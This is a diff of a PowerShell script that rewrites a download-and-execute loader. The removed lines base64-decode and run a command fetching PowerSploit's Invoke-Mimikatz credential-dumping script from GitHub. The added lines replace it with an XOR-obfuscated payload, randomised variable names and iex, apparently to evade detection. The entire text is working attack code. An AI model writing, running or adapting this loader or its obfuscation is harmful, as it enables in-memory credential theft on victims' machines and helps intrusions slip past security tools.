@@ -2,8 +2,15 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 
 
-
-
-$SfiEinkVKN = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAHMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAcwBwAGwAbwBpAHQALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALwBFAHgAZgBpAGwAdAByAGEAdABpAG8AbgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABzADEAJwApAA=="
-    $decoded_code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($SfiEinkVKN))
-    Invoke-Expression $decoded_code
+$VaCkljMhpY = "OwAmABsAagB/ADwABgA0AGcAGAAQAAkAJgApACMAUgAtACYAPgB5ACUABgAhAAkAOwAbAAYALQA+AH4AXAAnACwAPQA5AB4ADAAiAC4ABAAGABEAKgAkADAAWgBEACsAPgAjAAIAEAB5AGUAeAAAAAIANABkADAAGwAXACsAPwA1AAcAEAAmADgANAAdAA0ANwAvADkABgBNACAAJQA6AF0AMwAsAD0AMgAAABAAKwAvADsAHgAuACIALAA+ABMATAATACUAIAAXABEAMAA6ADsAHQAKADcAZQAlABcABQAwAGUAPwAXAAIAJwA5AHgAHwACADAAPgAyAAAATAAGADIAMQAbAA8ANwA4ADYABgAKACwAJAB4ADsADQA1ACUAPAAXAE4ADgAjADoAGwAIACIAPgAtAFwAEwAwAHsAcABbAA=="
+    $YumAlqDovT = "rcCJW"
+    function kneZCpRFUR($d, $k) {
+        $r = ""
+        for ($i = 0; $i -lt $d.Length; $i++) {
+            $r += [char]($d[$i] -bxor [byte][char]$k[$i % $k.Length])
+        }
+        return $r
+    }
+    $ltztfoezhO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($VaCkljMhpY))
+    $decoded_code = kneZCpRFUR $ltztfoezhO $YumAlqDovT
+    iex $decoded_code
